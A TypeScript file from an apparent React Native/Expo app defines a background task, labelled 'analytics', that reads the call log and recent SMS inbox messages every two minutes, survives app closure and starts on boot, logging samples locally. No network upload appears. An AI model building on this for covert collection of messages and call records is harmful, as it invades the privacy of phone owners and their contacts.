// backgroundTasks.ts
import AsyncStorage from "@react-native-async-storage/async-storage";
import * as BackgroundFetch from "expo-background-fetch";
import * as TaskManager from "expo-task-manager";
import SmsAndroid from "react-native-get-sms-android";
import { getCallLogsSafe } from "./callLogs";

const TASK_NAME = "FETCH_ANALYTICS_TASK";

// Helper function to append logs to AsyncStorage
async function appendLog(message: string) {
  try {
    const prevLogs = (await AsyncStorage.getItem("bgLogs")) || "";
    const timestamp = new Date().toISOString();
    const newLog = `[${timestamp}] ${message}\n`;
    await AsyncStorage.setItem("bgLogs", prevLogs + newLog);
  } catch (e) {
    console.error("Failed to write log:", e);
  }
}

// Extracted task logic so we can call it manually
export async function fetchAnalyticsTask() {
  try {
    await appendLog("⏰ Background task triggered — fetching data...");

    // --- Call Logs ---
    const callLogs = await getCallLogsSafe();
    await appendLog(`📞 Recent Calls: ${JSON.stringify(callLogs.slice(0, 3))}`);

    // --- SMS ---
    await new Promise<void>((resolve) => {
      (SmsAndroid as any).list(
        JSON.stringify({ box: "inbox", maxCount: 10 }),
        (fail: any) => {
          appendLog(`❌ SMS Fetch Failed: ${fail}`);
          resolve();
        },
        (count: number, smsList: string) => {
          const messages = JSON.parse(smsList);
          appendLog(`💬 Recent SMS: ${JSON.stringify(messages.slice(0, 3))}`);
          resolve();
        }
      );
    });

    await appendLog("✅ Background task completed successfully");
    return BackgroundFetch.BackgroundFetchResult.NewData;
  } catch (err) {
    await appendLog(`❌ Background task failed: ${err}`);
    return BackgroundFetch.BackgroundFetchResult.Failed;
  }
}

// Define the task for Expo background fetch
TaskManager.defineTask(TASK_NAME, async () => {
  return fetchAnalyticsTask();
});

// Register background task
export async function registerBackgroundTask() {
  try {
    const status = await BackgroundFetch.getStatusAsync();

    if (
      status === BackgroundFetch.BackgroundFetchStatus.Restricted ||
      status === BackgroundFetch.BackgroundFetchStatus.Denied
    ) {
      await appendLog("⚠️ Background fetch unavailable");
      return;
    }

    await BackgroundFetch.registerTaskAsync(TASK_NAME, {
      minimumInterval: 120, // every 2 minutes
      stopOnTerminate: false,
      startOnBoot: true,
    });

    await appendLog("✅ Background task registered (runs every 2 min)");
  } catch (error) {
    await appendLog(`❌ Error registering background task: ${error}`);
  }
}
